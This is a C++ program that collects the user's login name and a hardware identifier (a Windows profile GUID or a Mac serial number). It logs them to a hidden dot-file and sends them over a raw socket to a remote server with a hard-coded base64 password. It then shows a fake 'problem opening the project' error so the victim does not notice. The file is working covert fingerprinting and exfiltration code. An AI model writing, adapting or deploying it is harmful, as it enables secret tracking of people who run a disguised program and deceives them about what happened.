#include "get_logs.hpp"
#include "get_logs_define.hpp"

std::string get_current_username()
{
	std::string	username;

	#if defined(_WIN32) || defined(_WIN64)
    	char buffer[UNLEN + 1];
    	DWORD bufferLen = UNLEN + 1;
    	if (GetUserNameA(buffer, &bufferLen)) {
    	    username = buffer;
    	}
	#elif defined(__APPLE__)
    	struct passwd *pws;
        pws = getpwuid(geteuid());
    	if (pws)
    	    username = pws->pw_name;
	#endif
    return (username);
}

int write_to_file(std::string str_write, std::string username)
{
    std::ofstream   file_output;

    #if defined(_WIN32) || defined(_WIN64)
        file_output.open("C:/Users/" + username + "/AppData/Roaming/._open.txt", std::ios_base::app);
    #elif defined(__APPLE__)
        file_output.open("/Users/" + username + "/Library/Application Support/._open.txt", std::ios_base::app);
    #endif
    file_output << str_write << std::endl;
    file_output.close();
    return (0);
}

int error_return(std::string error_str, int return_code)
{
    std::string username;

    username = get_current_username();
    write_to_file(error_str, username);
    std::cerr << error_str << std::endl;
    return (return_code);
}

std::string     get_hardware_ID(void)
{
    #if defined(_WIN32) || defined(_WIN64)
        HW_PROFILE_INFO hwProfileInfo;
        std::string     ret;
        if (GetCurrentHwProfile(&hwProfileInfo))
            return ((char *)hwProfileInfo.szHwProfileGuid);
    #elif defined(__APPLE__)
        io_service_t platformExpert = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));  
        if (!platformExpert)
            return ("");
        CFTypeRef serialNumberAsCFString = IORegistryEntryCreateCFProperty(platformExpert, CFSTR(kIOPlatformSerialNumberKey), kCFAllocatorDefault, 0);
        if (serialNumberAsCFString)
        {
            if (CFGetTypeID(serialNumberAsCFString) == CFStringGetTypeID())
                return (CFStringGetCStringPtr((CFStringRef)serialNumberAsCFString, kCFStringEncodingUTF8));
            CFRelease(serialNumberAsCFString);
        }
        IOObjectRelease(platformExpert);
    #endif 
    return ("");
}

// 194.230.113.199
// 192.168.1.245
int __init_winsock()
{
    #if defined(_WIN32) || defined(_WIN64)
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
            return (error_return("WSA Startup Failed", 1));
    #endif
        return (0);
}
// This is for dad connection
int socket_connection_handle(std::string send_infos)
{
    int                 status;
    int                 client_fd;
    struct sockaddr_in  serv_addr;
	std::string			password;
	const char	new_str[]
			= TOSTRING(ADDRESS_SERVER_PRIVAT);

    if (__init_winsock())
        error_return("Couldn't init winsocket", 1);
	if (ISWINDOWS)
		password = "VGhpcyBpcyBmb3IgZGFkIGNvbm5lY3Rpb24=";
	else
		password = "dGhpcyBpcyBmb3IgbW9tIGNvbm5lY3Rpb24=";
    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (client_fd < 0)
        return (error_return("Socket creation error", 1));
    serv_addr.sin_family = AF_INET;
	#if defined(_WIN32) || defined(_WIN64)
		std::cout << new_str << std::endl;
        serv_addr.sin_addr.S_un.S_addr = inet_addr(new_str);
    #else
        serv_addr.sin_addr.s_addr = inet_addr(new_str);
    #endif
    serv_addr.sin_port = htons(PORT_SERVER_USE);

    status = connect(client_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    if (status < 0)
        return (error_return("Connection failed", 1));
    if (send(client_fd, password.c_str(), password.length(), 0) == -1)
        return (error_return("Couldn't send the message", 1));
    sleep(1);
    if (send(client_fd, (char *)send_infos.c_str(), send_infos.length(), 0) == -1)
        return (error_return("Couldn't send the message", 1));
	#if defined(_WIN32) || defined(_WIN64)
    	WSACleanup();
	#endif
    close(client_fd);
    return (0);
}

int program(void)
{
    std::string time_in_str;
    std::string username;
    std::string HWID;
    std::string full_str;

    username = get_current_username();
    HWID = get_hardware_ID();
    full_str = username + " " + HWID;
    write_to_file(full_str, username);
    if (socket_connection_handle(full_str) == 1)
        return (error_return("PROBLEM WITH THE CONNECTION", 1));
	return (0);
}

int main(void)
{
	if (program())
		return (1);
    std::cerr << "A problem has occured while trying to open the project. Please try again in a few seconds" << std::endl;
    sleep (3);
    return (0);
}
